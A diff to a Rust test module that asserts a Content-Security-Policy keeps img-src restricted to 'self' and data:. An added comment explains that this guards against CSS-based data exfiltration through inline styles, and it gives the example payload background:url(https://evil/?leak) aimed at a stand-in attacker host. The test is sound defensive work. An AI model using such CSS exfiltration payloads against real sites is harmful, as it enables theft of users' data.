@@ -3548,6 +3548,16 @@ mod upload_helpers_tests {
             assert!(csp.contains("script-src 'self'"));
             assert!(csp.contains("worker-src 'self'"));
             assert!(!csp.contains("blob:"), "blob: should not be in CSP after voice removal");
+            // Load-bearing coupling: the vault sanitize schema allows inline `style`
+            // (frontend/src/components/markdown/sanitizeSchema.ts), and its safety argument
+            // rests entirely on img-src blocking CSS url()/image-set() exfiltration. If this
+            // is ever loosened to permit external image hosts, that wall silently falls and
+            // an admin note's style could exfiltrate via background:url(https://evil/?leak).
+            // Keep img-src restricted to 'self'/data: or revisit the style allowlist first.
+            assert!(
+                csp.contains("img-src 'self' data:"),
+                "img-src must stay 'self' data: — vault inline style exfil guard depends on it"
+            );
         } // index.html is always present in the bundle
     }
 
